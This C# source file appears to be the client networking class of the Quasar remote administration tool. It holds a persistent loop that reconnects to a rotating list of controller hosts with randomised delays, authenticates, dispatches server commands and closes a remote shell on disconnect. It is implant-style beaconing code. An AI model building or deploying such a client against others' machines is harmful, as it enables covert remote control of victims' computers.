using System;
using System.Diagnostics;
using System.Threading;
using System.Windows.Forms;
using xClient.Config;
using xClient.Core.Commands;
using xClient.Core.Data;
using xClient.Core.NetSerializer;
using xClient.Core.Packets;
using xClient.Core.Utilities;

namespace xClient.Core.Networking
{
    public class QuasarClient : Client
    {
        /// <summary>
        /// When Exiting is true, stop all running threads and exit.
        /// </summary>
        public static bool Exiting { get; private set; }
        public bool Authenticated { get; private set; }
        private readonly HostsManager _hosts;

        public QuasarClient(HostsManager hostsManager) : base()
        {
            this._hosts = hostsManager;

            base.Serializer = new Serializer(PacketRegistery.GetPacketTypes());
            base.ClientState += OnClientState;
            base.ClientRead += OnClientRead;
            base.ClientFail += OnClientFail;
        }

        public void Connect()
        {
            while (!Exiting) // Main Connect Loop
            {
                if (!Connected)
                {
                    Thread.Sleep(100 + new Random().Next(0, 250));

                    Host host = _hosts.GetNextHost();

                    base.Connect(host.IpAddress, host.Port);

                    Thread.Sleep(200);

                    Application.DoEvents();
                }

                while (Connected) // hold client open
                {
                    Application.DoEvents();
                    Thread.Sleep(2500);
                }

                if (Exiting)
                {
                    Disconnect();
                    return;
                }

                Thread.Sleep(Settings.RECONNECTDELAY + new Random().Next(250, 750));
            }
        }

        private void OnClientRead(Client client, IPacket packet)
        {
            var type = packet.GetType();

            if (!Authenticated)
            {
                if (type == typeof(Packets.ServerPackets.GetAuthentication))
                {
                    CommandHandler.HandleGetAuthentication((Packets.ServerPackets.GetAuthentication)packet, client);
                }
                else if (type == typeof(Packets.ServerPackets.SetAuthenticationSuccess))
                {
                    Authenticated = true;
                }
                return;
            }

            PacketHandler.HandlePacket(client, packet);
        }

        private void OnClientFail(Client client, Exception ex)
        {
            Debug.WriteLine("Client Fail - Exception Message: " + ex.Message);
            client.Disconnect();
        }

        private void OnClientState(Client client, bool connected)
        {
            Authenticated = false; // always reset authentication

            if (!connected && !Exiting)
                LostConnection();
        }

        private void LostConnection()
        {
            CommandHandler.CloseShell();
        }

        public void Exit()
        {
            Exiting = true;
            Disconnect();
        }
    }
}
